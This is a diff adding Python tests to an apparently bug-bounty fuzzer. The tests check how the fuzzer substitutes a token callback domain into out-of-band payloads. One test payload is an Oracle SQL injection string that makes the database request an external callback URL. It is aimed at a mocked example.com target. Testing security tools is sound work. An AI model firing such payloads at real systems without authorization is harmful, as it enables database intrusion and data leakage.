@@ -270,3 +270,88 @@ class TestFuzzJsonBody:
                 category="sql_injection",
             )
         assert findings == []
+
+
+class TestFuzzerOobSubstitution:
+    async def test_substitutes_oob_url_and_registers_token(
+        self,
+        respx_mock: respx.MockRouter,
+        fast_config: FuzzerConfig,
+    ) -> None:
+        from bounty_agent.oob import TokenRegistry
+
+        registry = PayloadRegistry.from_mapping(
+            {"sql_injection": ["1' AND UTL_HTTP.REQUEST('http://{OOB_URL}/x')--"]}
+        )
+        token_registry = TokenRegistry()
+        fuzzer = ResponsibleFuzzer(
+            config=fast_config,
+            registry=registry,
+            scope=None,
+            analyzers=(SqlInjectionAnalyzer(),),
+            oob_token_registry=token_registry,
+            oob_domain="callback.test",
+        )
+        captured: list[str] = []
+
+        def _responder(request: httpx.Request) -> httpx.Response:
+            captured.append(str(request.url))
+            return httpx.Response(200, text="ok")
+
+        respx_mock.get(url__startswith="https://example.com/search").mock(side_effect=_responder)
+
+        async with httpx.AsyncClient() as client:
+            await fuzzer.fuzz_endpoint(
+                client,
+                "https://example.com/search",
+                param="q",
+                category="sql_injection",
+            )
+
+        # A token should have been minted and stored.
+        tokens = token_registry.all_tokens()
+        assert len(tokens) == 1
+        token = tokens[0]
+        # The URL the fuzzer requested must contain <token>.callback.test
+        # instead of the {OOB_URL} placeholder.
+        assert any(f"{token.token}.callback.test" in url for url in captured), (
+            f"token not substituted into request URL: {captured}"
+        )
+        assert not any("{OOB_URL}" in url for url in captured), (
+            "placeholder leaked into outbound request"
+        )
+
+    async def test_oob_disabled_leaves_placeholder_as_is(
+        self,
+        respx_mock: respx.MockRouter,
+        fast_config: FuzzerConfig,
+    ) -> None:
+        # When the OOB integration is not wired, payloads with the
+        # placeholder are sent verbatim. (The fuzzer is policy-light:
+        # we don't want to silently swallow operator-authored
+        # payloads.)
+        registry = PayloadRegistry.from_mapping({"sql_injection": ["payload-{OOB_URL}-marker"]})
+        fuzzer = ResponsibleFuzzer(
+            config=fast_config,
+            registry=registry,
+            scope=None,
+            analyzers=(SqlInjectionAnalyzer(),),
+        )
+        captured: list[str] = []
+
+        def _responder(request: httpx.Request) -> httpx.Response:
+            captured.append(str(request.url))
+            return httpx.Response(200, text="ok")
+
+        respx_mock.get(url__startswith="https://example.com/").mock(side_effect=_responder)
+
+        async with httpx.AsyncClient() as client:
+            await fuzzer.fuzz_endpoint(
+                client,
+                "https://example.com/search",
+                param="q",
+                category="sql_injection",
+            )
+        # Placeholder is URL-encoded when sent on the wire but should
+        # remain (encoded as %7B / %7D) in the captured outbound URL.
+        assert any("%7BOOB_URL%7D" in url or "{OOB_URL}" in url for url in captured)
